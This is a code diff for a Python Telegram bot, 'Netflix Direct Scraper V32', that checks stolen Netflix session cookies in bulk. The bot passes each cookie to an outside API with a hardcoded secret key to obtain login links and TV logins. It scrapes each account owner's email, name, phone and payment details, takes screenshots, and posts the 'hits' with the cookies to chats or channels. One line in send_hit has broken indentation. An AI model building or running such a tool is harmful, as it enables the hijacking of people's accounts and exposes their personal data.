@@ -55,13 +55,9 @@ HEADERS = {
 API_BASE_URL = "http://nftgenapi.onrender.com/api"
 SECRET_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"
 
-CURRENCY_MAP = {"US": "$", "GB": "£", "IN": "₹", "TR": "₺", "ES": "€", "BR": "R$"}
-
 def get_flag(code):
     if not code or code == "Unknown" or len(code) != 2: return ""
     return "".join([chr(ord(c.upper()) + 127397) for c in code])
-
-def get_currency_symbol(code): return CURRENCY_MAP.get(code, "$")
 
 def clean_text(text):
     if not text: return "Unknown"
@@ -69,7 +65,7 @@ def clean_text(text):
     except: return text
 
 def extract_deep_details(html):
-    details = {"plan": "Unknown", "email": "N/A", "country": "Unknown", "profiles": [], "status": "Dead", "language": "English", "member_since": "Unknown", "member_duration": "", "expiry": "N/A", "price": "Unknown", "payment": "Unknown", "quality": "Unknown", "name": "Unknown", "phone": "N/A", "extra_members": "No ❌"}
+    details = {"plan": "Unknown", "email": "N/A", "country": "Unknown", "profiles": [], "status": "Dead", "member_since": "Unknown", "member_duration": "", "expiry": "N/A", "price": "Unknown", "payment": "Unknown", "quality": "Unknown", "name": "Unknown", "phone": "N/A", "extra_members": "No ❌"}
     
     if '"membershipStatus":"CURRENT_MEMBER"' in html: details["status"] = "Active"
     
@@ -100,9 +96,6 @@ def extract_deep_details(html):
     country_match = re.search(r'"currentCountry":"([^"]+)"', html)
     if country_match: details["country"] = country_match.group(1)
     
-    lang_match = re.search(r'"preferredLocale":"([^"]+)"', html)
-    if lang_match: details["language"] = clean_text(lang_match.group(1))
-    
     since_match = re.search(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
     if since_match:
         ts = int(since_match.group(1))
@@ -123,7 +116,7 @@ def extract_deep_details(html):
 def call_api(endpoint, payload):
     try:
         payload["secret_key"] = SECRET_KEY
-        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, timeout=10)
+        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, timeout=15)
         return resp.json()
     except: return None
 
@@ -136,17 +129,21 @@ def parse_smart_cookie(cookie_input):
                 if c.get('name') == 'NetflixId': return urllib.parse.unquote(c.get('value'))
         except: pass
     match = re.search(r"NetflixId=([^;]+)", cookie_input)
-    return urllib.parse.unquote(match.group(1)) if match else cookie_input
+    if match: return urllib.parse.unquote(match.group(1))
+    if len(cookie_input) > 50: return cookie_input
+    return None
 
 def check_cookie(cookie_input):
     nid_val = parse_smart_cookie(cookie_input)
+    if not nid_val: return {"valid": False}
+    
     api_res = call_api("gen", {"netflix_id": nid_val})
     if not api_res or not api_res.get("success"): return {"valid": False}
     
     session = requests.Session()
     session.cookies.set("NetflixId", nid_val, domain=".netflix.com")
     try:
-        acc_resp = session.get("https://www.netflix.com/YourAccount", headers=HEADERS, timeout=10)
+        acc_resp = session.get("https://www.netflix.com/YourAccount", headers=HEADERS, timeout=12)
         deep_data = extract_deep_details(acc_resp.text)
         if deep_data["email"] == "N/A": deep_data["email"] = api_res.get("email", "N/A")
         
@@ -158,7 +155,7 @@ def check_cookie(cookie_input):
                     context = browser.new_context()
                     context.add_cookies([{'name': 'NetflixId', 'value': nid_val, 'domain': '.netflix.com', 'path': '/'}])
                     page = context.new_page()
-                    page.goto("https://www.netflix.com/browse", timeout=15000, wait_until='load')
+                    page.goto("https://www.netflix.com/browse", timeout=20000, wait_until='load')
                     screenshot_bytes = page.screenshot(type='jpeg', quality=50)
                     browser.close()
             finally: SCREENSHOT_SEMAPHORE.release()
@@ -175,14 +172,38 @@ def start(message):
     kb.add("📺 TV Login", "🛑 Stop System")
     msg = ("**🔥 Netflix Direct Scraper V32**\n\n"
            "👋 **Welcome!** Here is how to use this bot:\n\n"
-           "1️⃣ **Select a Mode** using the buttons below.\n"
-           "2️⃣ **Send your Netflix Cookies** (Text or File).\n\n"
-           "🍪 **Supported Format:**\n"
-           "• `NetflixId=v2...`\n\n"
-           "📝 **Example:**\n"
-           "`NetflixId=v2.CT...`\n\n"
+           "1️⃣ **Select a Mode** below.\n2️⃣ **Send Netflix Cookies** (Text/File).\n\n"
+           "🍪 **Supported Format:**\n• `NetflixId=v2...` or JSON\n\n"
            "👇 **Select Mode to Begin:**")
     bot.send_message(message.chat.id, msg, reply_markup=kb, parse_mode='Markdown')
+
+@bot.message_handler(func=lambda m: m.text in ["📩 Send Here (DM)", "📡 Send to Channel", "🛑 Stop System"])
+def handle_mode_selection(message):
+    uid = message.chat.id
+    if message.text == "📩 Send Here (DM)":
+        user_modes[uid] = {'target': uid, 'stop': False}
+        bot.reply_to(message, "✅ **DM Mode Active.** Now send your cookies or file.")
+    elif message.text == "📡 Send to Channel":
+        msg = bot.reply_to(message, "📡 **Enter Channel ID (e.g. -100xxx):**")
+        bot.register_next_step_handler(msg, preview_ch)
+    elif message.text == "🛑 Stop System":
+        if uid in user_modes: user_modes[uid]['stop'] = True
+        bot.reply_to(message, "🛑 **Scanning Stopped.**")
+
+def preview_ch(message):
+    try:
+        cid = int(message.text.strip())
+        chat = bot.get_chat(cid)
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"setch_{cid}"))
+        bot.reply_to(message, f"📡 **Channel:** {chat.title}\nConfirm?", reply_markup=markup)
+    except: bot.reply_to(message, "❌ Invalid ID or Bot not Admin.")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("setch_"))
+def ch_callback(call):
+    cid = int(call.data.split("_")[1])
+    user_modes[call.message.chat.id] = {'target': cid, 'stop': False}
+    bot.edit_message_text(f"✅ **Target Set!**", call.message.chat.id, call.message.message_id)
 
 @bot.message_handler(func=lambda m: m.text == "📺 TV Login")
 def tv_login(message):
@@ -190,101 +211,92 @@ def tv_login(message):
     bot.register_next_step_handler(msg, tv_process_cookie)
 
 def tv_process_cookie(message):
-    cookie = message.text.strip()
-    res = check_cookie(cookie)
-    if not res.get("valid"): return bot.reply_to(message, "❌ **Cookie Dead!**")
-    
-    nid_clean = parse_smart_cookie(cookie)
-    bot.reply_to(message, f"✅ **Cookie Valid!**\n📧 **Email:** {res['data']['email']}\n\nNow enter **8-Digit TV Code**.")
-    bot.register_next_step_handler(message, lambda m: tv_execute(m, nid_clean))
+    cookie_text = message.text.strip()
+    res = check_cookie(cookie_text)
+    if not res.get("valid"): return bot.reply_to(message, "❌ **Cookie Dead or Invalid!**")
+    bot.reply_to(message, f"✅ **Cookie Valid!**\n📧 Email: {res['data']['email']}\n\nEnter **8-Digit TV Code**.")
+    bot.register_next_step_handler(message, lambda m: tv_execute(m, parse_smart_cookie(cookie_text)))
 
 def tv_execute(message, nid):
-    code = message.text.strip()
-    api_res = call_api("tvlogin", {"netflix_id": nid, "tv_code": code})
+    tv_code = message.text.strip()
+    api_res = call_api("tvlogin", {"netflix_id": nid, "tv_code": tv_code})
     bot.reply_to(message, f"📺 **Result:** {api_res.get('message', 'Error')}")
 
-@bot.message_handler(func=lambda m: m.text == "📡 Send to Channel")
-def ch_start(message):
-    msg = bot.reply_to(message, "📡 **Enter Channel ID (e.g. -100xxx):**")
-    bot.register_next_step_handler(msg, ch_verify)
-
-def ch_verify(message):
-    try:
-        cid = int(message.text.strip())
-        chat = bot.get_chat(cid)
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"setch_{cid}"))
-        bot.reply_to(message, f"📡 **Channel:** {chat.title}\n**ID:** {cid}\nConfirm?", reply_markup=markup)
-    except: bot.reply_to(message, "❌ Invalid ID or Bot not Admin.")
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("setch_"))
-def ch_callback(call):
-    cid = int(call.data.split("_")[1])
-    user_modes[call.message.chat.id] = {'target': cid, 'stop': False}
-    bot.edit_message_text(f"✅ **Target set to:** {cid}", call.message.chat.id, call.message.message_id)
-
 @bot.message_handler(content_types=['document', 'text'])
-def handle_cookies(message):
-    mode = user_modes.get(message.chat.id)
-    if not mode or mode.get('stop'): return bot.reply_to(message, "❌ Select mode first!")
+def handle_input(message):
+    uid = message.chat.id
+    if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
     
-    raw_cookies = []
+    mode = user_modes.get(uid)
+    if not mode: return bot.reply_to(message, "❌ **Select a Mode first!** (Click DM or Channel button)")
+    
+    cookies = []
     if message.content_type == 'document':
         file_info = bot.get_file(message.document.file_id)
-        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
-        raw_cookies = [line for line in content.splitlines() if len(line) > 20]
-    else: raw_cookies = message.text.splitlines()
+        downloaded_file = bot.download_file(file_info.file_path)
+        if message.document.file_name.endswith('.zip'):
+            with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
+                for filename in z.namelist():
+                    if filename.endswith('.txt'):
+                        with z.open(filename) as f:
+                            cookies.extend([l.strip() for l in f.read().decode('utf-8', errors='ignore').splitlines() if len(l.strip()) > 30])
+        else:
+            cookies = [l.strip() for l in downloaded_file.decode('utf-8', errors='ignore').splitlines() if len(l.strip()) > 30]
+    else:
+        cookies = [l.strip() for l in message.text.splitlines() if len(l.strip()) > 30]
 
-    bot.reply_to(message, f"🚀 **Checking {len(raw_cookies)} cookies...**")
+    if not cookies: return bot.reply_to(message, "❌ **No valid cookies found!**")
+
+    status_msg = bot.reply_to(message, "⏳ **Checking...**")
     
-    def worker(cookies, target, chat_id):
+    def background_task():
+        total = len(cookies)
         hits = []
-        for c in cookies:
-            if user_modes.get(chat_id, {}).get('stop'): break
+        for i, c in enumerate(cookies, 1):
+            if mode.get('stop'): break
+            # Progress Bar logic
+            prog = int((i/total)*10)
+            bar = "■"*prog + "□"*(10-prog)
+            try: bot.edit_message_text(f"🚀 **Checking:** [{bar}] {int((i/total)*100)}%\nChecked: {i}/{total}", uid, status_msg.message_id)
+            except: pass
+            
             res = check_cookie(c)
-            if res["valid"]:
+            if res.get("valid"):
                 hits.append(res)
-                send_hit(target, res, c)
+                send_hit(mode['target'], res, c)
         
+        bot.delete_message(uid, status_msg.message_id)
         if hits:
-            report = "========================================\nNETFLIX HITS SUMMARY\n========================================\n\n"
+            report = "========================================\nNETFLIX HITS REPORT\n========================================\n\n"
             for h in hits: report += f"Email: {h['data']['email']}\nPlan: {h['data'].get('plan', 'N/A')}\nLink: {h['magic_link']}\n\n" + "-"*40 + "\n"
-            with io.BytesIO(report.encode()) as f:
-                f.name = "Hits_Report.txt"
-                bot.send_document(chat_id, f, caption="📂 **Bulk Check Complete - Hits File Generated**")
+            bot.send_document(uid, io.BytesIO(report.encode()), caption=f"✅ **Check Complete!** Found {len(hits)} Hits.")
 
-    threading.Thread(target=worker, args=(raw_cookies, mode['target'], message.chat.id)).start()
+    threading.Thread(target=background_task).start()
 
 def send_hit(target, res, cookie):
     data = res.get("data", {})
     def esc(t): return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
-    
-    country = res.get('country', 'Unknown')
-    flag = get_flag(country)
-    
-    lines = []
+lines = []
     lines.append("🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟")
     lines.append("")
     lines.append(f"🟢 **STATUS:** Active ✅")
     
+    # Enhancement: Veteran Badge & Expiry Countdown
     if data.get('member_since') and data['member_since'] != "Unknown":
         try:
             yrs = (datetime.now() - datetime.strptime(data['member_since'], '%Y-%m-%d')).days // 365
             if yrs >= 2: lines.append(f"🏅 **BADGE:** {yrs} Year Veteran Account")
         except: pass
 
-    lines.append(f"🌍 **REGION:** {esc(country)} {flag}")
-    
+    lines.append(f"🌍 **REGION:** {esc(res.get('country', 'Unknown'))} {get_flag(res.get('country', ''))}")
     if data.get('member_since') and data['member_since'] != "Unknown":
         lines.append(f"⏰ **MEMBER SINCE:** {esc(data['member_since'])} {esc(data.get('member_duration', ''))}")
 
     lines.append(f"👤 **OWNER:** {esc(data.get('name', 'Unknown'))}")
-    
     plan = data.get('plan', 'Premium')
     icon = "💎" if "premium" in plan.lower() else "✅" if "standard" in plan.lower() else "📱"
     lines.append(f"{icon} **PLAN:** {esc(plan)}")
     lines.append(f"📺 **QUALITY:** {esc(data.get('quality', 'Unknown'))}")
-    
     lines.append(f"💰 **PRICE:** {esc(data.get('price', 'Unknown'))}")
     lines.append(f"💳 **PAYMENT:** {esc(data.get('payment', 'Unknown'))}")
 
@@ -297,14 +309,12 @@ def send_hit(target, res, cookie):
     if data.get('profiles'):
         lines.append(f"🎭 **PROFILES ({len(data['profiles'])}):** {', '.join([esc(p) for p in data['profiles']])}")
             
-    lines.append(f"🌐 **LANGUAGE:** {esc(data.get('language', 'English'))}")
     lines.append(f"📧 **EMAIL:** {esc(data.get('email', 'N/A'))}")
     lines.append(f"☎️ **PHONE:** {esc(data.get('phone', 'N/A'))}")
     lines.append(f"👥 **EXTRA MEMBERS:** {esc(data.get('extra_members', 'No ❌'))}")
     
     lines.append("")
     lines.append(f"💜 [CLICK HERE TO LOGIN]({res['magic_link']}) 💜")
-    
     lines.append("")
     lines.append("📋 **COOKIE (TAP TO COPY):**")
     lines.append(f"<code>{esc(cookie)}</code>")
@@ -313,11 +323,10 @@ def send_hit(target, res, cookie):
     lines.append("👨‍💻 **Admin:** [Message Me](https://t.me/F88UF) | 📢 **Channel:** [Join Here](https://t.me/F88UF9844)")
     
     msg = "\n".join(lines)
-    if res['screenshot']:
+    if res.get('screenshot'):
         bot.send_photo(target, io.BytesIO(res['screenshot']), caption=msg, parse_mode='HTML')
     else: bot.send_message(target, msg, parse_mode='HTML')
 
 if __name__ == "__main__":
     keep_alive()
     bot.infinity_polling(skip_pending=True)
-        
